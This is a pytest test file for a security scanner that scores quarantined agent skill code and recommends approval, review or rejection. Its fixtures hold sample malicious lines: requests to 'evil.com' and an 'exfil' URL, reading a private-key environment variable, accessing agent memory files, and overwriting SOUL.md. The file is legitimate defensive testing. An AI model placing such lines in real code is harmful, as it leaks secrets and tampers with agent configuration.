"""Tests for shield_scan.py"""
import json
import pytest
from pathlib import Path
from unittest.mock import patch


@pytest.fixture(autouse=True)
def patch_quarantine(tmp_path):
    import scripts.shield_scan as ss
    ss.QUARANTINE_ROOT = tmp_path / "quarantine"
    ss.QUARANTINE_ROOT.mkdir(parents=True, exist_ok=True)
    yield tmp_path


def _make_quarantine(tmp_path: Path, asset_id: str, content: str) -> Path:
    import scripts.shield_scan as ss
    dest = ss.QUARANTINE_ROOT / asset_id
    raw  = dest / "raw"
    raw.mkdir(parents=True, exist_ok=True)
    (raw / "skill.py").write_text(content)
    return dest


def test_clean_file_low_score(tmp_path):
    from scripts.shield_scan import scan_asset
    _make_quarantine(tmp_path, "aaa111", "def hello():\n    return 42\n")
    result = scan_asset("aaa111")
    assert result["scan_score"] < 30
    assert result["recommendation"] == "approve"


def test_eval_triggers_high_score(tmp_path):
    from scripts.shield_scan import scan_asset
    _make_quarantine(tmp_path, "bbb222", "result = eval(user_input)\n")
    result = scan_asset("bbb222")
    assert result["scan_score"] >= 25
    assert any(f["rule_id"] == "eval_exec" for f in result["findings"])


def test_subprocess_flagged(tmp_path):
    from scripts.shield_scan import scan_asset
    _make_quarantine(tmp_path, "ccc333", "import subprocess\nsubprocess.run(['ls'])\n")
    result = scan_asset("ccc333")
    assert any(f["rule_id"] == "subprocess" for f in result["findings"])


def test_soul_md_access_flagged(tmp_path):
    """SOUL.md access alone → score 40 (review), not auto-reject."""
    from scripts.shield_scan import scan_asset
    _make_quarantine(tmp_path, "ddd444", "open('SOUL.md', 'w').write('pwned')\n")
    result = scan_asset("ddd444")
    assert result["scan_score"] >= 40
    assert any(f["rule_id"] == "soul_agents" for f in result["findings"])
    assert result["recommendation"] in ("review", "reject")


def test_combined_bad_patterns_auto_reject(tmp_path):
    """SOUL.md + subprocess + eval → score ≥ 80 → auto-reject."""
    from scripts.shield_scan import scan_asset
    code = "import subprocess\neval(x)\nopen('SOUL.md','w')\n"
    _make_quarantine(tmp_path, "ddd555", code)
    result = scan_asset("ddd555")
    assert result["scan_score"] >= 80
    assert result["recommendation"] == "reject"


def test_env_read_flagged(tmp_path):
    from scripts.shield_scan import scan_asset
    _make_quarantine(tmp_path, "eee555", "key = os.environ['HL_PRIVATE_KEY']\n")
    result = scan_asset("eee555")
    assert any(f["rule_id"] == "env_read" for f in result["findings"])


def test_openclaw_memory_access_flagged(tmp_path):
    from scripts.shield_scan import scan_asset
    _make_quarantine(tmp_path, "fff666", "Path.home() / '.openclaw' / 'openclaw.json'\n")
    result = scan_asset("fff666")
    assert any(f["rule_id"] == "openclaw_memory" for f in result["findings"])


def test_review_json_written(tmp_path):
    from scripts.shield_scan import scan_asset
    import scripts.shield_scan as ss
    _make_quarantine(tmp_path, "ggg777", "x = 1\n")
    scan_asset("ggg777")
    review = json.loads((ss.QUARANTINE_ROOT / "ggg777" / "review.json").read_text())
    assert "scan_score" in review
    assert "recommendation" in review
    assert "findings" in review


def test_score_capped_at_100(tmp_path):
    from scripts.shield_scan import scan_asset
    # Multiple high-scoring rules to push past 100
    bad_code = (
        "eval(user)\n"
        "import subprocess\n"
        "import pickle\n"
        "os.environ['X']\n"
        "open('SOUL.md','w')\n"
        "import requests\n"
        "requests.get('http://evil.com')\n"
    )
    _make_quarantine(tmp_path, "hhh888", bad_code)
    result = scan_asset("hhh888")
    assert result["scan_score"] <= 100


def test_network_allowlisted_domain_not_flagged(tmp_path):
    from scripts.shield_scan import scan_asset
    code = "import httpx\nhttpx.get('https://api.hyperliquid.xyz/info')\n"
    _make_quarantine(tmp_path, "iii999", code)
    result = scan_asset("iii999")
    # network rule should be suppressed for allowlisted domain
    net_findings = [f for f in result["findings"] if f["rule_id"] == "network"]
    assert net_findings == []


def test_network_non_allowlisted_flagged(tmp_path):
    from scripts.shield_scan import scan_asset
    code = "import requests\nrequests.get('https://evil.hacker.com/exfil')\n"
    _make_quarantine(tmp_path, "jjj000", code)
    result = scan_asset("jjj000")
    net_findings = [f for f in result["findings"] if f["rule_id"] == "network"]
    assert net_findings != []


def test_missing_quarantine_raises(tmp_path):
    from scripts.shield_scan import scan_asset
    with pytest.raises(FileNotFoundError):
        scan_asset("nonexistent_asset_id")


def test_non_python_files_not_scanned(tmp_path):
    """Binary and image files should not be scanned."""
    from scripts.shield_scan import scan_asset
    import scripts.shield_scan as ss
    dest = ss.QUARANTINE_ROOT / "kkk111"
    raw  = dest / "raw"
    raw.mkdir(parents=True, exist_ok=True)
    (raw / "image.png").write_bytes(b"\x89PNG\r\n")
    (raw / "model.bin").write_bytes(b"\x00\x01\x02eval(")
    result = scan_asset("kkk111")
    assert result["scan_score"] == 0
